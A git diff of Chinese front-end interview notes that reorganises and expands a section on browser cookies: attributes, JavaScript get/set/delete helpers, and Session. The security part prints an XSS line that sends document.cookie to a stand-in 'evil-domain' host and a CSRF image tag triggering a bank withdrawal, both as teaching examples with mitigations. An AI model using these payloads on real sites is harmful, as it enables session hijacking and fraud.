@@ -705,21 +705,9 @@ box2.addEventListener('click', function(e) {
 
 ## `document.querySelectorXX` 和 `document.getElementByXX` 的区别
 
-## Cookie
-
-## Session
-
 ## localStorage
 
 ## sessionStorage
-
-### 增删改查
-
-ref
-
-- [https://www.w3school.com.cn/js/js_cookies.asp](https://www.w3school.com.cn/js/js_cookies.asp)
-
-### 不同二级域名共享 cookie
 
 # V8 专区
 
@@ -1684,6 +1672,145 @@ ref
 ![http-post](https://qiniu1.lxfriday.xyz/feoffer/http-post2.png)
 【POST 请求(application/x-www-form-urlencoded)】
 ![http-post](https://qiniu1.lxfriday.xyz/feoffer/http-post3.png)
+
+### Cookie
+
+#### Cookie 是什么
+
+![cookie](https://qiniu1.lxfriday.xyz/feoffer/07ca8977-d2ab-480e-fc56-bd5704f27d1c.png)
+
+Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向**同一服务器**再发起请求时被携带并发送到服务器上。
+
+Cookie 主要用于以下三个方面：
+
+- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
+- 个性化设置（如用户自定义设置、主题等）
+- 浏览器行为跟踪（如跟踪分析用户行为等）
+
+#### Domain
+
+`Domain` 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。**如果指定了 Domain，则一般包含子域名（子域名可以访问父域名的 Cookie）**。
+
+例如，如果设置 `Domain=mozilla.org`，则 Cookie 也包含在子域名中（如 `developer.mozilla.org`）。
+
+#### Path
+
+Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 `%x2F` (`/`) 作为路径分隔符，子路径也会被匹配。
+
+设置 `Path=/docs`，则以下地址都会匹配：
+
+- `/docs`
+- `/docs/Web/`
+- `/docs/Web/HTTP`
+
+#### Expires/Max-Age
+
+Cookie 的过期时间，过了这个时间之后 Cookie 将会自动删除。
+
+```http
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+```
+
+```javascript
+document.cookie = 'promo_shown=1; Max-Age=2600000; Secure'
+```
+
+#### HttpOnly
+
+为避免跨域脚本 (XSS) 攻击，通过 JavaScript 的 `Document.cookie` API 无法访问带有 `HttpOnly` 标记的 Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 `HttpOnly` 标记。
+
+```http
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+```
+
+#### Secure
+
+标记为 `Secure` 的 Cookie 只应通过**被 HTTPS 协议加密**过的请求发送给服务端。
+
+#### SameSite
+
+ref
+
+- [https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html](https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html)
+
+`SameSite` Cookie 允许服务器要求某个 Cookie 在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。
+
+```http
+Set-Cookie: key=value; SameSite=Strict
+```
+
+- `None` 浏览器会在同站请求、跨站请求下继续发送 Cookies，不区分大小写；
+- `Strict` 浏览器将只发送相同站点请求的 Cookie(即当前网页 URL 与请求目标 URL 完全一致)。如果请求来自与当前 location 的 URL 不同的 URL，则不包括标记为 Strict 属性的 Cookie；
+- `Lax` 在新版本浏览器中，为**默认**选项，Same-site Cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到 URL 时才会发送。如 link 链接；
+
+#### 增删改查
+
+ref
+
+- [https://www.w3school.com.cn/js/js_cookies.asp](https://www.w3school.com.cn/js/js_cookies.asp)
+
+设置 Cookie 和修改 Cookie 相同：
+
+```javascript
+function setCookie(cname, cvalue, exdays) {
+  const d = new Date()
+  d.setTime(d.getTime() + exdays * 24 * 60 * 60 * 1000)
+  const expires = 'expires=' + d.toUTCString()
+  return (document.cookie = cname + '=' + cvalue + ';' + expires + ';path=/')
+}
+```
+
+删除 Cookie：
+
+```javascript
+function deleteCookie(cname) {
+  const d = new Date()
+  const expires = 'expires=' + d.toUTCString()
+  return (document.cookie = cname + '=' + ';' + expires + ';path=/')
+}
+```
+
+查询 Cookie：
+
+```javascript
+function getCookie(cname) {
+  const cookieObj = document.cookie.split(';').reduce((prev, curr) => {
+    const entry = curr.split('=')
+    prev[entry[0].trim()] = entry[1]
+    return prev
+  }, {})
+  if (cname) return cookieObj[cname]
+  return cookieObj
+}
+```
+
+#### 不同二级域名共享 Cookie
+
+#### Cookie 常见问题
+
+1. Cookie 不区分端口
+
+#### Cookie 安全-会话劫持和 XSS
+
+```javascript
+new Image().src = 'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie
+```
+
+`HttpOnly` 类型的 Cookie 由于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。
+
+#### Cookie 安全-跨站请求伪造（CSRF）
+
+```html
+<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
+```
+
+当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。
+
+这种情况只是一种假设，实际上应该不允许使用 GET 修改数据，对转账的操作需要添加二次确认。
+
+### Session
+
+基于 Cookie 实现，会话期 Cookie 是最简单的 Cookie：**浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效**。会话期 Cookie 不需要指定过期时间（`Expires`）或者有效期（`Max-Age`）。
 
 ## UDP
 
